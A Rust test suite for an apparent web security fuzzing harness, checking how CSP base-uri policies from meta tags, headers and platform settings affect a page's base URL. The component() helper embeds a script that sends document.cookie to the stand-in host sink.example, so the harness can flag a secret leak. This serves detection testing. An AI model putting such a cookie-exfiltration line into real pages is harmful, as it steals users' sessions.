//! Persistent document CSP base policies. Local Firefox158 reference rows;
//! cached Chromium128 differences are retained in the audit evidence.
//! https://w3c.github.io/webappsec-csp/#directive-base-uri
use appfuzz_core::{
    browser::{Browser, SESSION},
    harness::App,
    manifest::Manifest,
    plan::Plan,
    record::OutcomeKind,
};
use serde_json::{Value, json};
use std::sync::Arc;
fn visit(case: &str, expected: &[&str]) {
    let browser = Browser::shared().unwrap();
    let fixture = include_str!("fixtures/base_policy.js");
    let helpers = fixture.split("test('").next().unwrap();
    let selected = fixture.lines().find(|line| line.starts_with(&format!("test('{case}',"))).unwrap();
    let script = format!("const CASE={};{helpers}{selected};runTests().then(()=>{{for(const line of groups[CASE])console.log(line)}})", json!(case));
    let prefix = match case {
        "parser-meta-before-base" => "<head><meta http-equiv=\"Content-Security-Policy\" content=\"base-uri 'none'\"><base href=\"/nested/\"></head>",
        "parser-base-before-meta" => "<head><base href=\"/nested/\"><meta http-equiv=\"Content-Security-Policy\" content=\"base-uri 'none'\"></head>",
        "parser-template-inert" => "<head><template><meta http-equiv=\"Content-Security-Policy\" content=\"base-uri 'none'\"></template></head>",
        _ => "",
    };
    let csp = if case == "header-none" { vec!["base-uri 'none'"] } else { vec![] };
    let input = json!({"url":"https://app.example/","csp":csp,"html":format!("<!doctype html>{prefix}<body><script>{script}</script>")});
    let run = browser.app.run(&browser.app.spec(browser.app.export(SESSION).unwrap(), vec![json!(input.to_string())], Plan::default(), 1));
    assert_eq!(run.outcome.kind, OutcomeKind::Ok, "{:?}", run.outcome);
    let report: Value = serde_json::from_str(run.result.as_ref().unwrap().as_str().unwrap()).unwrap();
    assert!(report.get("fatal").is_none(), "{report}");
    assert_eq!(report["errors"], json!([]), "{report}");
    assert_eq!(report["unmodelled"], json!([]), "{report}");
    assert_eq!(report["busy"]["cut"], false, "{report}");
    let actual: Vec<_> = report["console"].as_array().unwrap().iter().map(|v| v["text"].as_str().unwrap()).collect();
    assert_eq!(actual, expected, "{case}");
}

#[test]
fn meta_none() {
    visit("meta-none", &["/ /child"]);
}

#[test]
fn meta_removal_persists() {
    visit("meta-removal-persists", &["/"]);
}

#[test]
fn meta_content_change_ignored() {
    visit("meta-content-change-ignored", &["/nested/"]);
}

#[test]
fn meta_late_content_ignored() {
    visit("meta-late-content-ignored", &["/nested/"]);
}

#[test]
fn meta_late_equiv_ignored() {
    visit("meta-late-equiv-ignored", &["/nested/"]);
}

#[test]
fn meta_reinsertion_processes() {
    visit("meta-reinsertion-processes", &["/"]);
}

#[test]
fn meta_body_ignored() {
    visit("meta-body-ignored", &["/nested/"]);
}

#[test]
fn meta_nested_head_ignored() {
    visit("meta-nested-head-ignored", &["/"]);
}

#[test]
fn meta_detached_head_ignored() {
    visit("meta-detached-head-ignored", &["/nested/"]);
}

#[test]
fn meta_detached_head_connects() {
    visit("meta-detached-head-connects", &["/nested/"]);
}

#[test]
fn meta_equiv_whitespace_ignored() {
    visit("meta-equiv-whitespace-ignored", &["/nested/"]);
}

#[test]
fn base_before_policy_retains_unread() {
    visit("base-before-policy-retains-unread", &["/nested/", "/"]);
}

#[test]
fn base_before_policy_retains_read() {
    visit("base-before-policy-retains-read", &["/nested/", "/nested/", "/"]);
}

#[test]
fn base_before_policy_reinsert() {
    visit("base-before-policy-reinsert", &["/"]);
}

#[test]
fn fragment_base_before_meta() {
    visit("fragment-base-before-meta", &["/nested/"]);
}

#[test]
fn fragment_meta_before_base() {
    visit("fragment-meta-before-base", &["/"]);
}

#[test]
fn meta_intersection() {
    visit("meta-intersection", &["/"]);
}

#[test]
fn default_src_no_base_fallback() {
    visit("default-src-no-base-fallback", &["/nested/"]);
}

#[test]
fn duplicate_directive_first_wins() {
    visit("duplicate-directive-first-wins", &["/nested/"]);
}

#[test]
fn comma_separated_policy_intersection() {
    visit("comma-separated-policy-intersection", &["/"]);
}

#[test]
fn meta_self_allow() {
    visit("meta-self-allow", &["/nested/"]);
}

#[test]
fn meta_self_block() {
    visit("meta-self-block", &["/"]);
}

#[test]
fn meta_path_match() {
    visit("meta-path-match", &["/Allowed/child"]);
}

#[test]
fn meta_path_case_sensitive() {
    visit("meta-path-case-sensitive", &["/"]);
}

#[test]
fn meta_path_encoded_match() {
    visit("meta-path-encoded-match", &["/Allowed/child"]);
}

#[test]
fn meta_wildcard_host_allow() {
    visit("meta-wildcard-host-allow", &["/nested/"]);
}

#[test]
fn meta_wildcard_host_block_root() {
    visit("meta-wildcard-host-block-root", &["/"]);
}

#[test]
fn meta_scheme_upgrade() {
    visit("meta-scheme-upgrade", &["/nested/"]);
}

#[test]
fn meta_empty_blocks() {
    visit("meta-empty-blocks", &["/"]);
}

#[test]
fn meta_none_with_other_source() {
    visit("meta-none-with-other-source", &["/nested/"]);
}

#[test]
fn header_none() {
    visit("header-none", &["/"]);
}

#[test]
fn header_report_only_ignored() {
    visit("header-report-only-ignored", &["/nested/"]);
}

#[test]
fn parser_meta_before_base() {
    visit("parser-meta-before-base", &["/"]);
}

#[test]
fn parser_base_before_meta() {
    visit("parser-base-before-meta", &["/nested/", "/"]);
}

#[test]
fn parser_template_inert() {
    visit("parser-template-inert", &["/nested/"]);
}

#[test]
fn meta_private_attributes() {
    visit("meta-private-attributes", &["/"]);
}

#[test]
fn meta_private_head() {
    visit("meta-private-head", &["/"]);
}

#[test]
fn meta_frozen_wrapper() {
    visit("meta-frozen-wrapper", &["/"]);
}

#[test]
fn meta_inert_document_isolation() {
    visit("meta-inert-document-isolation", &["/other/ /nested/"]);
}

fn component(headers: &[(&str, &str)], policy: Option<&str>) -> Arc<App> {
    let body_type = "(list u8)";
    let script = "const b=document.createElement('base');b.href='/nested/';document.head.append(b);console.log(new URL(document.baseURI).pathname);if(new URL(document.baseURI).pathname==='/')fetch('https://sink.example/?v='+encodeURIComponent(document.cookie))";
    let html = format!("<!doctype html><body><script nonce=base-review>{script}</script>");
    let encoded: String = html.as_bytes().iter().map(|byte| format!("\\{byte:02x}")).collect();
    let mut records = vec![];
    let mut text = vec![];
    for (name, value) in headers {
        for field in [*name, *value] {
            records.extend_from_slice(&(16384u32 + text.len() as u32).to_le_bytes());
            records.extend_from_slice(&(field.len() as u32).to_le_bytes());
            text.extend_from_slice(field.as_bytes());
        }
    }
    let escape = |bytes: &[u8]| bytes.iter().map(|b| format!("\\{b:02x}")).collect::<String>();
    let records = escape(&records);
    let text = escape(&text);
    let count = headers.len();
    let wat = format!(
        r#"(component
      (core module $m
        (memory (export "memory") 2)
        (global $heap (mut i32) (i32.const 32768))
        (func (export "realloc") (param i32 i32 i32) (param $size i32) (result i32)
          (local $ptr i32) (local.set $ptr (i32.and (i32.add (global.get $heap) (i32.const 7)) (i32.const -8)))
          (global.set $heap (i32.add (local.get $ptr) (local.get $size))) (local.get $ptr))
        (data (i32.const 4096) "{encoded}")
        (data (i32.const 1024) "{records}")
        (data (i32.const 16384) "{text}")
        (func (export "handle") (param i32 i32 i32) (param $uri_len i32) (param i32 i32) {option_tag} (param $body i32) (param $len i32) (result i32)
          (i32.store (i32.const 2048) (i32.const 200))
          (i32.store (i32.const 2052) (i32.const 1024)) (i32.store (i32.const 2056) (i32.const {count}))
          (if (i32.eq (local.get $uri_len) (i32.const 20))
            (then (i32.store (i32.const 2060) (i32.const 4096)) (i32.store (i32.const 2064) (i32.const {len})))
            (else (i32.store (i32.const 2060) (local.get $body)) (i32.store (i32.const 2064) (local.get $len))))
          (i32.const 2048)))
      (core instance $i (instantiate $m))
      (alias core export $i "memory" (core memory $memory))
      (alias core export $i "realloc" (core func $realloc))
      (type $headers (list (tuple string string)))
      (type $req (record (field "method" string) (field "uri" string) (field "headers" $headers) (field "body" {body_type})))
      (export $request "request" (type $req))
      (type $resp (record (field "status" u16) (field "headers" $headers) (field "body" (list u8))))
      (export $response "response" (type $resp))
      (func (export "handle") (param "request" $request) (result $response)
        (canon lift (core func $i "handle") (memory $memory) (realloc $realloc))))"#,
        len = html.len(),
        option_tag = if body_type.starts_with("(option") { "(param i32)" } else { "" }
    );
    let mut manifest = Manifest::for_wasm(std::path::Path::new("body-echo.wasm"));
    manifest.entry = Some(
        serde_json::from_value(json!({"export":"handle","output":{"status":"status","headers":"headers","body":"body"},"result":{"body":"html:scripts"}}))
            .unwrap(),
    );
    manifest.entry.as_mut().unwrap().csp = policy.map(str::to_string);
    Arc::new(App::from_bytes(manifest, wat::parse_str(wat).unwrap()).unwrap())
}

fn connected(headers: &[(&str, &str)], policy: Option<&str>, expected: &str) {
    let app = component(headers, policy);
    let page = app.run(&app.spec(
        app.export("handle").unwrap(),
        vec![json!({"method":"GET","uri":"https://app.example/","headers":[],"body":[]})],
        Plan::default(),
        1,
    ));
    assert_eq!(page.outcome.kind, OutcomeKind::Ok, "{:?}", page.outcome);
    let runner = |spec: &appfuzz_core::record::RunSpec| app.run(spec);
    let (session, findings) = appfuzz_core::browser::evaluate(&app, &page, &runner).unwrap();
    assert!(session.report.get("fatal").is_none(), "{}", session.report);
    assert_eq!(session.report["errors"], json!([]), "{}", session.report);
    assert_eq!(session.report["unmodelled"], json!([]), "{}", session.report);
    assert_eq!(session.report["console"][0]["text"], expected, "{}", session.report);
    assert_eq!(findings.iter().any(|f| f.kind == "secret_leak"), expected == "/", "{findings:?}");
}
#[test]
fn response_header_csp_controls_the_connected_browser_and_its_findings() {
    connected(&[("content-security-policy", "base-uri 'none'")], None, "/");
}
#[test]
fn response_header_matching_is_case_insensitive() {
    connected(&[("CONTENT-SECURITY-POLICY", "base-uri 'none'")], None, "/");
}
#[test]
fn report_only_response_policy_does_not_block_the_base() {
    connected(&[("content-security-policy-report-only", "base-uri 'none'")], None, "/nested/");
}
#[test]
fn platform_csp_restricts_an_app_policy() {
    connected(&[("content-security-policy", "base-uri *")], Some("base-uri 'none'"), "/");
}
#[test]
fn app_csp_restricts_a_platform_policy() {
    connected(&[("content-security-policy", "base-uri 'none'")], Some("base-uri *"), "/");
}
#[test]
fn repeated_response_policies_intersect() {
    connected(&[("content-security-policy", "base-uri *"), ("Content-Security-Policy", "base-uri 'none'")], None, "/");
}
#[test]
fn an_absent_base_directive_has_no_default_src_fallback() {
    connected(&[], Some("default-src 'none';script-src 'nonce-base-review'"), "/nested/");
}
